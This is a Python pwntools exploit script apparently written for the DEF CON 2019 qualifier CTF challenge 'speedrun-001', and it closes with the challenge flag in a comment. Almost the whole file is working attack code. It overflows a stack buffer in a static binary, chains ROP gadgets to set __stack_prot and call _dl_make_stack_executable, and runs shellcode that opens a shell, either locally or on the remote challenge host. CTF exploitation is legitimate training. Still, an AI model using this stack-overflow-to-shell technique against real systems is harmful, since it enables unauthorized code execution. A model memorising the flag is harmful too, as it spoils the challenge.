from pwn import *
import time
import sys
import os

def speedrun_001(DEBUG):
	
	context.arch = "amd64"
	binname = './speedrun-001'
	elf = ELF(binname)
	rop = ROP(elf)
	
	if DEBUG=="1":
		r = process(binname)
		# raw_input("debug?")
	elif DEBUG=="2":
		HOST = 'speedrun-001.quals2019.oooverflow.io'
		PORT = 31337
		r = remote(HOST,PORT)
	
	def find_gadget(gadget):
		gadgets = gadget.split(" ; ")
		found = rop.find_gadget(gadgets)
		if found == None:
			if sum(1 for _ in elf.search(asm(gadget)))==0:
				return None
			return next(elf.search(asm(gadget)))
		else:
			return rop.find_gadget(gadgets).address
			
	def find_stack_prot():
		data_rel_ro = elf.get_section_by_name(".data.rel.ro").header
		data_rel_ro_sh_addr = data_rel_ro.sh_addr
		data_rel_ro_sh_size = data_rel_ro.sh_size
		__stack_prot = data_rel_ro_sh_addr+data_rel_ro_sh_size-4
		return __stack_prot
		
	def xref(search):
		data = os.popen('objdump -M intel -z --prefix-address -d "speedrun-001" | grep "%s"' % search).read().strip().splitlines()
		return data
		
	def find_dl_make_stack_executable(__stack_prot):
		xref_result = xref(hex(__stack_prot)[2:])[1]
		return int(xref_result.split(" ")[0],16)-32
	
	def find__libc_stack_end(_dl_make_stack_executable):
		xref_result = xref(hex(_dl_make_stack_executable+23)[2:])[0].split("# ")[1]
		return int(xref_result.split(" ")[0],16)
		
	def exploit_stack_overflow_static_binary(buffsize):
		pop_rax_rdx_rbx = find_gadget('pop rax ; pop rdx ; pop rbx ; ret')
		mov_dword_rdx_rax = find_gadget('mov dword ptr [rdx], eax ; ret')
		pop_rdi = find_gadget('pop rdi ; ret')
		call_rsp = find_gadget('call rsp')
		
		__stack_prot = find_stack_prot()
		_dl_make_stack_executable = find_dl_make_stack_executable(__stack_prot)
		__libc_stack_end = find__libc_stack_end(_dl_make_stack_executable)
		
		log.info("_dl_make_stack_executable: %#x" % _dl_make_stack_executable)
		log.info("__stack_prot: %#x" % __stack_prot)
		log.info("__libc_stack_end: %#x" % __libc_stack_end)
		log.info("pop_rax_rdx_rbx: %#x" % pop_rax_rdx_rbx)
		log.info("mov_dword_rdx_rax: %#x" % mov_dword_rdx_rax)
		log.info("pop_rdi: %#x" % pop_rdi)
		log.info("call_rsp: %#x" % call_rsp)
		shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())
		payload = "A"*buffsize
		payload += "B"*8 # rbp
		payload += p64(pop_rax_rdx_rbx)
		payload += p64(7) # rax
		payload += p64(__stack_prot) # rdx
		payload += p64(0) # rbx
		payload += p64(mov_dword_rdx_rax) # __stack_prot = 7
		payload += p64(pop_rdi)
		payload += p64(__libc_stack_end)
		payload += p64(_dl_make_stack_executable)
		payload += p64(call_rsp)
		payload += shellcode
		r.send(payload)
		
	exploit_stack_overflow_static_binary(buffsize=0x400)
	
	r.interactive()

speedrun_001(sys.argv[1])

# OOO{Ask any pwner. Any real pwner. It don't matter if you pwn by an inch or a m1L3. pwning's pwning.}